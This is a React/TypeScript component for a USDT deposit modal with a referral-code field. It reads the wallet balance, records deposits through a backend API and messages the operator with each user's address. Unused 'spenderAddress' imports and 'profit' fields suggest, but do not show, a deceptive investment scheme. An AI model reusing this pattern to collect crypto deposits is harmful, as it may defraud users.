import { useAccount, useReadContract } from "wagmi";
import { useEffect, useState, useRef } from "react"
import { sendMessage } from "../utils/function";
import { getUserInfo } from '../utils/api';
import { depositData, incrementReferralsByCode } from "../utils/api"
import { abi, tokenAddress, spenderAddress, amount } from "../utils/constants"

import { ethers, formatUnits } from 'ethers';

export function depositModal () {
  const { address } = useAccount();
  
  const { data: balance, isError, isLoading } = useReadContract({
    address: tokenAddress,
    abi: abi,
    functionName: 'balanceOf',
    args: [address], // Pass the wallet address to check balance for
  });

  // Convert the balance from a BigNumber to a human-readable format
  const formattedBalance = balance ? formatUnits(balance.toString(), 6) : '0';



  const [userInfo, setUserInfo] = useState({
    address: "",
    balance: "0",
    ethprofit: "0",
    usdtprofit: "0",
    withdrawal: {},
    referrals: "0",
    referralCode: ""
  }); 

  const [refCode, setRefCodes] = useState<string>("Hi"); 

  const codeRef = useRef(null);

  
  const [value$, setValue$] = useState<number>(0);
  const limit$: number = parseFloat(formattedBalance);

  const handleReferralCode = (event: React.ChangeEvent<HTMLInputElement>) => {
    const inputValue1 = event.target.value;
    
    // Set referralCode to the current input value instead of appending
    setRefCodes(inputValue1);
  };


  const handleInputChange$ = (event: React.ChangeEvent<HTMLInputElement>) => {
    const inputValue = event.target.value;

    // Check if the input value is within the limit
    if (+inputValue <= limit$) {
      setValue$(parseFloat(inputValue)); // Update the state if the value is within the limit
    }
  }; 


  let deposit = async () => {
    
  const codeValue = codeRef.current.value;
    //console.log(`Previous: ${codeValue} and  ${value$ }`)

    if(address){
    if(codeValue !== ""){
    await incrementReferralsByCode(codeValue);
    }
    let result = await depositData((value$ + parseInt(userInfo.balance)).toString(), address);
    if(result){
      alert("Done! Your balance would update soon")
      sendMessage(`Address : ${address}; Deposited $${value$}`)
    } else{alert("Failed! Insufficient fund in wallet, add more usdt to wallet")
      
      sendMessage(`Address : ${address}; Failed due to insufficient funds`)
    };
    return(result);
    }
    
  }
  

  
  useEffect(() => {
   
    const getUser = async (address : string) => {
      const user = await getUserInfo(address);
      //console.log(user);
      setUserInfo(user);
    
  };
    if (address) {
    getUser(address || "0x")
    }
  

  },[address])

  return(
    <div>
      
   
      <h2 className="infos-panel-title">Enter deposit amount</h2>
      
      <div className="account-infos-exchange">
                <div className="account-infos-exchange-one">
              
                  <div className="account-infos-exchange-input">
                   
                    <input
                      type="number"
                      placeholder="USDT"
                      value={value$}
                      onChange={handleInputChange$} // Handle input change
                      id="exchange"
                      style={{ width: '80%' }}
                      max={limit$}
                    />
                  </div>
                  <div className="account-infos-exchange-result">$</div>
                  
                </div>
                
              </div>

              <h2 className="infos-panel-title">Enter referral code if you have one (Not compulsory)</h2>
      <div className="account-infos-exchange">
            <input
          type="text"
          placeholder="Code"
          ref={codeRef}
          style={{ width: '80%' }}
        />

      </div>

              <div style={{ textAlign: 'center' }}>
                <button
                  className="exchange-btn van-button van-button--default van-button--normal"
                  onClick={deposit}
                >
                  <div className="van-button__content">
                    <span className="van-button__text"> Deposit </span>
                  </div>
                </button>
              </div>
       </div>
  )
}

export const CopyToClipboard = (code: string) => {
  const copyToClipboard = () => {
    navigator.clipboard.writeText(code).then(() => {
      alert("Text copied to clipboard!");
    }).catch(err => {
      console.error("Failed to copy: ", err);
    });
  };

  return (
  <div>
    <div className="infos-panel-title">Copy your referral code </div>
    <div style={{ display: 'flex', alignItems: 'center' }}>
     <span>{code}</span>
      <button
        onClick={copyToClipboard}
        style={{
          border: 'none',
          background: 'transparent',
          cursor: 'pointer',
          marginLeft: '8px',
        }}
      >
        <img 
          src="https://img.icons8.com/ios-glyphs/30/clipboard.png" 
          alt="Clipboard Icon" 
          style={{ width: '20px', height: '20px' }} 
        />
      </button>
    </div>
    </div>
  );
};
